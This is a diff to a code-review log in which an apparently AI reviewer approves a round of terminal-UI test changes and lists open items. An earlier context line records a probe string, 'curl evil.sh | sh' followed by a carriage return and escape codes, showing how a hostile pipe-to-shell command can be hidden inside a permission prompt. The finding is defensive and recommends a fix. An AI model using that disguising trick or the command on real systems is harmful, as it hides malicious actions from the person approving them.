@@ -724,3 +724,15 @@ changed: the intent row (still waiting on the owner's `askedFor` ruling) and
 - **Pre-existing (NOT this diff, flagged because R2 makes the ask the safety net):** the ask's detail is the pod's raw `explanation` (`client/src/permission-router.ts:107`), and a `\r` survives into the frame. Probe: detail `"curl evil.sh | sh\rls -la             \u001b[2Kecho ok"` → frame row `curl evil.sh | sh\rls -la`, so on a real terminal the CR moves the cursor back and `ls -la` overwrites the visible command. The `ESC[2K…` tail also vanished from the frame. The same applies to the transcript `$` row (`fitSubtitle` keeps `\r`). Recommend a `fix/` task: render control chars in the ask visibly (e.g. `␍`, `\x1b` → `␛`), never pass them to the terminal.
 - **Executor behaviour:** honest PARTIAL labels, red-first shown, mutations real; it missed the one Q3 assertion the plan named.
 
+### Round 3
+
+*— claude-opus-5-5, 2026-11-21* (fresh context; scope: `git diff HEAD~1` = `8786d973`, test + doc only)
+
+**Verdict: APPROVE** (for what is built; the intent row is still waiting on the owner's `askedFor` ruling).
+
+- **Round 2 MEDIUM (Q3 full colour unpinned) — FIXED.** The new test forces `chalk.level = 3`, checks dark + light, and uses a non-vacuity probe (the cwd row must be dim). Mutation `<Text key={i} {...dim}>` on the detail rows → `no detail row is dimmed …` RED (9/1); restored; `git status` empty.
+- **Regressions:** the test touches globals (`chalk.level`, theme mode), and `afterAll` restores them. The whole `packages/tui` suite passes 2901/0, so there is no cross-file leak.
+- **R3 closed:** this worktree now has `apps/mobile/node_modules`. `bun run typecheck` (root + `apps/mobile` + `apps/relay`) has **0 errors**. Mobile tests (`shell-intent-step`, `transcript-cell`, `tool-steps`, `shell-rows-store`) + `packages/config` + core `shell-intent`: 551/0.
+- **Lint:** clean (2213 files). The full `bun test` / `bun run check` was not re-run in this round. The orchestrator's merge gate must run it.
+- **Still open, not blocking:** (1) the intent row (owner's `askedFor` decision); (2) the pre-existing `\r`/ESC pass-through in the ask and the `$` row → its own `fix/` task, which the executor rightly left out of scope.
+
